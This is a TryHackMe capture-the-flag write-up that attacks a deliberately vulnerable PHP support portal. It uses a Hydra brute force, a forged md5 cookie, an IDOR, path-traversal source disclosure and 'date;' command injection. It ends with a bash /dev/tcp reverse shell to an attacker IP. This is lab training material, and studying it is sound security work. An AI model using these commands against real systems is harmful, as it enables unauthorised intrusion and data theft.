# support

Room: https://tryhackme.com/room/support

Pentest the Support Ops platform to exploit vulnerabilities and achieve RCE.

A new internal Support Operations Platform has been deployed to assist IT and helpdesk teams. The application handles user management, internal APIs, and system-level operations. However, security was not the primary focus during development. Several features rely on user-controlled input and weak trust boundaries.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/support.md

---

The target is a PHP-based Support Operations Platform. The intended attack chain abuses several weak trust boundaries:

1. Exposed `phpinfo()` page leaking a usable PHP session ID
2. Weak helpdesk credentials
3. Client-side `isITUser` trust using predictable `md5("true")`
4. IDOR in the internal user API
5. Source disclosure through the `skin` parameter
6. Admin login using a discovered password pattern
7. Command injection through the admin-only system operation form
8. Reverse shell as `www-data`
9. User flag read from `/home/ubuntu/user.txt`

Flags and passwords are redacted in this write-up.

---

## 1. Initial Web Enumeration

I started by running Gobuster against the web root:

```bash
gobuster dir -u http://10.64.134.2/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,bak,old
```

Interesting results included:

```text
/api.php              (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
/footer.php           (Status: 200) [Size: 1253]
/includes             (Status: 301) [--> http://10.64.134.2/includes/]
/index.php            (Status: 200) [Size: 2591]
/info.php             (Status: 200) [Size: 73266]
/js                   (Status: 301) [--> http://10.64.134.2/js/]
/layout               (Status: 301) [--> http://10.64.134.2/layout/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/skins                (Status: 301) [--> http://10.64.134.2/skins/]
```

The exposed `info.php` page was immediately interesting because it revealed PHP configuration details and a live session cookie.

---

## 2. Exposed PHP Info

The `info.php` page exposed PHP session settings:

```text
session.name = PHPSESSID
session.save_handler = files
session.save_path = /var/lib/php/sessions
session.cookie_httponly = Off
session.cookie_secure = Off
session.use_strict_mode = Off
```

It also leaked a `PHPSESSID` value in the request details.

This became useful later because the application trusted a combination of a valid PHP session and a weak client-controlled cookie.

---

## 3. Login Page Review

The login form on `index.php` used these fields:

```html
<input type="email" name="email" class="form-control" placeholder="help@support.thm" required>
<input type="password" name="password" class="form-control" required>
```

The placeholder gave a likely username:

```text
help@support.thm
```

A small brute force against that account found valid helpdesk credentials:

```bash
hydra -l help@support.thm -P /usr/share/wordlists/rockyou.txt 10.64.134.2 http-post-form "/index.php:email=^USER^&password=^PASS^:Invalid credentials"
```

Hydra found the helpdesk password. The password is redacted here.

---

## 4. Source Disclosure via the Skin Parameter

After logging in, the dashboard exposed a theme selector:

```html
<li><a class="dropdown-item" href="?skin=default">Default</a></li>
<li><a class="dropdown-item text-danger" href="?skin=red">Red</a></li>
<li><a class="dropdown-item text-success" href="?skin=green">Green</a></li>
<li><a class="dropdown-item text-primary" href="?skin=blue">Blue</a></li>
```

The dashboard source later showed this vulnerable logic:

```php
$webRoot = realpath('/var/www/html/skins');
$another = realpath('/var/www/html');
$requested = realpath($webRoot . '/' . $skin . '.php');

if ($requested !== false && strpos($requested, $another) === 0) {
    readfile($requested);
}
```

This allowed PHP source disclosure for files under `/var/www/html` by traversing out of `/skins`.

For example:

```bash
curl -s 'http://10.64.134.2/dashboard.php?skin=../dashboard' \
  -H 'Cookie: PHPSESSID=<LEAKED_SESSION>; isITUser=<MD5_TRUE>'
```

This did not execute the target PHP file. It read it as text with `readfile()`.

Useful files were dumped with:

```bash
for f in index dashboard api config footer logout includes/header includes/skin; do
  echo "===== $f ====="
  curl -s "http://10.64.134.2/dashboard.php?skin=../$f" \
    -H 'Cookie: PHPSESSID=<LEAKED_SESSION>; isITUser=<MD5_TRUE>'
  echo
done
```

---

## 5. Weak IT Cookie Trust

The leaked login logic showed this:

```php
$_SESSION['loggedin'] = true;
$_SESSION['user_id']  = $id;
$_SESSION['admin']  = $user['admin'];

setcookie(
    'isITUser',
    $user['admin'] ? md5("true") : md5("false"),
    time() + 3600,
    '/'
);
```

The application later checked whether the user was an IT user by comparing the cookie value to `md5("true")`.

The MD5 of `true` is:

```text
b326b5062b2f0e69046810717534cb09
```

With the leaked PHP session ID and this forged cookie, the internal API became accessible:

```bash
curl -s "http://10.64.134.2/user/1" \
  -H 'Cookie: PHPSESSID=<LEAKED_SESSION>; isITUser=b326b5062b2f0e69046810717534cb09'
```

---

## 6. Internal User API IDOR

The source of `api.php` showed this logic:

```php
$id = $_GET['id'] ?? $_SESSION['user_id'];
$user = $users[$id] ?? null;

if (preg_match('#^/user/#', $_SERVER['REQUEST_URI'])) {
    header('Content-Type: application/json');
    unset($user['password']);

    echo json_encode($user, JSON_PRETTY_PRINT);
    exit;
}
```

The endpoint let an authenticated IT user enumerate other users by changing the ID in the path.

User enumeration:

```bash
for i in 0 1 2 3 4 5 6 7 8 9 10; do
  echo "===== USER $i ====="
  curl -s "http://10.64.134.2/user/$i" \
    -H 'Cookie: PHPSESSID=<LEAKED_SESSION>; isITUser=b326b5062b2f0e69046810717534cb09'
  echo
done
```

This revealed:

```text
/user/1 -> specialadmin@support.thm, admin true
/user/2 -> IT@support.thm, admin false
/user/3 -> help@support.thm, admin false
```

The API removed the password field, so this did not directly reveal the admin password.

---

## 7. Config Source Leak

Using the skin source disclosure against `config.php` revealed:

```php
$MASTER_PASSWORD = '<REDACTED>';
$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```

This was a useful hint toward the admin password pattern, but it did not work directly as the login password. A nearby variant worked for the `specialadmin@support.thm` account. The password is redacted in this write-up.

Admin login was performed with:

```bash
curl -i -c admin_cookies.txt -X POST http://10.64.134.2/index.php \
  -d 'email=specialadmin@support.thm' \
  -d 'password=<REDACTED>'
```

---

## 8. Administrator Dashboard Flag

With a real admin session, the dashboard displayed the administrator block:

```php
<?php if (isset($_SESSION['admin']) && $_SESSION['admin'] === true): ?>
    ...
    <?= htmlspecialchars(trim(file_get_contents('/var/www/web.txt'))) ?>
<?php endif; ?>
```

This printed the first flag:

```text
THM{REDACTED_ADMIN_FLAG}
```

---

## 9. Admin-Only Command Injection

The source of `footer.php` revealed the system-level operation:

```php
$isAdmin = $_SESSION['admin'];

$output = '';
$error  = '';

$selectedSys = 'date';

if ($isAdmin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys'])) {

    $selectedSys = $_POST['sys'];
    $sys = $_POST['sys'];

    if (strpos($sys, 'date') === 0) {
        $output = shell_exec($sys); 
    } else {
        $error = 'Only date command is allowed.';
    }
}
```

The filter only checked that the command started with `date`.

That meant command injection was possible by prefixing payloads with `date;`.

Test command execution:

```bash
curl -s -X POST http://10.64.134.2/dashboard.php \
  -b admin_cookies.txt \
  --data-urlencode 'sys=date;id'
```

---

## 10. Reverse Shell

I started a listener:

```bash
nc -lvnp 4444
```

Then sent a reverse shell through the `sys` parameter:

```bash
curl -s -X POST http://10.64.134.2/dashboard.php \
  -b admin_cookies.txt \
  --data-urlencode 'sys=date;bash -c "bash -i >& /dev/tcp/<ATTACKBOX_IP>/4444 0>&1"'
```

The listener received a shell as `www-data`:

```text
Connection received on 10.64.134.2
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
www-data@tryhackme-2404:/var/www/html$
```

Confirmed user:

```bash
id
whoami
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

---

## 11. User Flag

From the reverse shell, the user flag was readable:

```bash
cat /home/ubuntu/user.txt
```

Flag:

```text
THM{REDACTED_USER_FLAG}
```

---

## Vulnerability Summary

### Exposed `phpinfo()`

`info.php` disclosed PHP session configuration and a live PHP session ID.

### Weak Client-Side Trust

The application trusted the `isITUser` cookie for IT access. Since the expected value was only `md5("true")`, it was trivial to forge.

### IDOR

The internal user API allowed access to other users by changing the user ID.

### Source Disclosure

The `skin` parameter used `readfile()` and allowed traversal within `/var/www/html`, which exposed PHP source code.

### Weak Password Pattern

The leaked configuration hinted at the admin password pattern, allowing `specialadmin@support.thm` login.

### Command Injection

The admin-only system operation used:

```php
shell_exec($sys)
```

and only checked:

```php
strpos($sys, 'date') === 0
```

This allowed commands such as:

```text
date;id
date;cat /var/www/web.txt
date;bash -c "..."
```

---

## Final Chain

```text
Gobuster finds info.php, api.php, dashboard.php, config.php
info.php leaks PHPSESSID
Hydra finds helpdesk credentials
Forge isITUser = md5("true")
Access internal API
IDOR reveals specialadmin user
Skin traversal reads PHP source
Config leak hints admin password pattern
Log in as specialadmin
Admin dashboard reveals first flag
footer.php reveals command injection
Use sys=date;payload for RCE
Catch reverse shell as www-data
Read /home/ubuntu/user.txt
```
